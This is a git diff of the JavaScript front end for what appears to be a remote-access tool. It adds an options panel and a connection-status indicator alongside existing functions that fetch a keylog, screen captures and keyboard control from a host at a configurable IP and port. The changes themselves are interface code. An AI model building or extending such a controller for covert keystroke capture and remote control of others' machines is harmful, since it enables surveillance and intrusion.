@@ -23,6 +23,11 @@ function connect(type = "both") {
         type = [type];
     }
 
+    let statusElement = document.getElementById("status");
+    statusElement.textContent = "🟡";
+
+    checkStatus();
+
     let random = `?_=${Date.now()}`;
 
     if (type.includes("screen")) {
@@ -266,7 +271,6 @@ async function keylog() {
 
     let response = await fetch(url)
         .then((response) => response.json())
-        .then((response) => listFiles(response))
         .catch((error) => log(`${error}`, "error"));
 
     let lines = response.keylog;
@@ -326,6 +330,73 @@ function keyboard(type) {
     requestGet(url);
 }
 
+function setOption(option, value) {
+    let url =
+        `http://${IP}:${PORT}/options?` +
+        `key=${encodeURIComponent(option)}&` +
+        `value=${encodeURIComponent(value)}`;
+
+    fetch(url)
+        .then((response) => response.json())
+        .then((response) => getOptions())
+        .catch((error) => log(`${error}`, "error"));
+}
+
+async function getOptions() {
+    let url = `http://${IP}:${PORT}/options`;
+
+    let response = await fetch(url)
+        .then((response) => response.json())
+        .catch((error) => log(`${error}`, "error"));
+
+    let options = response.options;
+
+    optionsElement.replaceChildren("");
+
+    for (let option in options) {
+        let optionElement = document.createElement("div");
+        optionElement.classList.add("option");
+
+        let optionNameElement = document.createElement("div");
+        optionNameElement.classList.add("option-name");
+        optionNameElement.textContent = option.replaceAll("_", " ");
+
+        let value = options[option];
+        let optionValueElement = document.createElement("div");
+        optionValueElement.classList.add("option-value");
+        let valueId =
+            "option-value-" +
+            document.getElementsByClassName("option-value").length;
+        if (typeof value === "boolean") {
+            let valueButton = document.createElement("button");
+            valueButton.id = valueId;
+            valueButton.textContent = value;
+            valueButton.addEventListener("click", () => {
+                setOption(option, !value);
+            });
+            optionValueElement.appendChild(valueButton);
+        } else if (typeof value == "string") {
+            let valueInput = document.createElement("input");
+            valueInput.type = "text";
+            valueInput.id = valueId;
+            valueInput.value = value;
+            optionValueElement.appendChild(valueInput);
+            let valueButton = document.createElement("button");
+            valueButton.textContent = "update";
+            valueButton.addEventListener("click", (event) => {
+                setOption(option, document.getElementById(valueId).value);
+            });
+            optionValueElement.appendChild(valueButton);
+        }
+
+        console.log(option, value);
+
+        optionElement.appendChild(optionNameElement);
+        optionElement.appendChild(optionValueElement);
+        optionsElement.appendChild(optionElement);
+    }
+}
+
 let ipElement = document.getElementById("ip");
 let portElement = document.getElementById("port");
 let runElement = document.getElementById("run");
@@ -333,7 +404,7 @@ let pathElement = document.getElementById("path");
 let forcedElement = document.getElementById("forced");
 let ipLockedElement = document.getElementById("ip-locked");
 let keylogElement = document.getElementById("keylog");
-let forcedTextElement = document.getElementById("forced-text");
+let optionsElement = document.getElementById("options");
 
 if (!localStorage.getItem("ip")) {
     localStorage.setItem("ip", "127.0.0.1");
@@ -351,6 +422,7 @@ let commandHistory = [];
 let commandIndex = -1;
 let PATH = pathElement.value;
 let ipLockData = [false, false];
+let ipStatus = false;
 
 ipElement.addEventListener("input", () => {
     checkIp();
@@ -390,11 +462,41 @@ pathElement.addEventListener("input", () => {
     setPath(pathElement.value);
 });
 
-forcedTextElement.addEventListener("click", () => {
-    forcedElement.click();
-});
-
 checkIp();
 checkPort();
 ls();
 keylog();
+getOptions();
+
+function setStatus() {
+    let statusElement = document.getElementById("status");
+    if (ipStatus) {
+        statusElement.textContent = "🟢";
+    } else {
+        statusElement.textContent = "🔴";
+    }
+}
+
+function checkStatus() {
+    const url = `http://${IP}:${PORT}`;
+
+    fetch(url)
+        .then((response) => {
+            const statusCode = response.status;
+
+            if ([200, 404].includes(statusCode)) {
+                ipStatus = true;
+            } else {
+                ipStatus = false;
+            }
+            setStatus();
+        })
+        .catch((error) => {
+            ipStatus = false;
+            setStatus();
+        });
+}
+
+setInterval(checkStatus, 10000);
+
+checkStatus();
